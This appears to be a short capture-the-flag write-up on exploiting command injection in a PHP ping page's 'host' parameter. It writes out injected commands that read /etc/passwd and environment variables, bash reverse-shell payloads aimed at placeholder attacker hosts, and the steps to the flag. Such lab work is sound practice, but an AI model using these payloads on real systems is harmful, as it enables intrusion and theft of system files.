When opening the site, the following text appears: "Command executed: ping -c 2 127.0.0.1"

The URL is `/index.php?host=127.0.0.1` which indicates that the IP or maybe more is controllable.

I tried to set `host=127.0.0.1;cat /etc/passwd` which showed the content of the `/etc/passwd` file. This measn we can control the command and inject our own.

I then tried to inject `127.0.0.1;bash -c bash -i >& /dev/tcp/<attack-ip-with-netcat-open>/<attacker-netcat-port> 0>&1` as URL encoded payload to open a reverse shell but it didn't work.

I then tried `127.0.0.1;ls .` but it returned only `index.php`. 

`127.0.0.1;echo $PWD` shows, that the directory is `/var/www/html`. 

By injecting `env` into the host parameter, the environment variables were displayed, but the flag was not found among them.

`127.0.0.1;ls /root` showed nothing.

I tried multiple attempts to open a reverse shell but it didn't work (for example I tried `bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1` but no luck).

Okay, seems that only a Webshell works.

My attempts to open a reverse shell broke the container because I modified the PHP file so I had to restart it.

Then I tried to serch for the flag with the payload `ls /`. This revealed a `flag.txt` file entry which I could read by calling `cat /flag.txt`
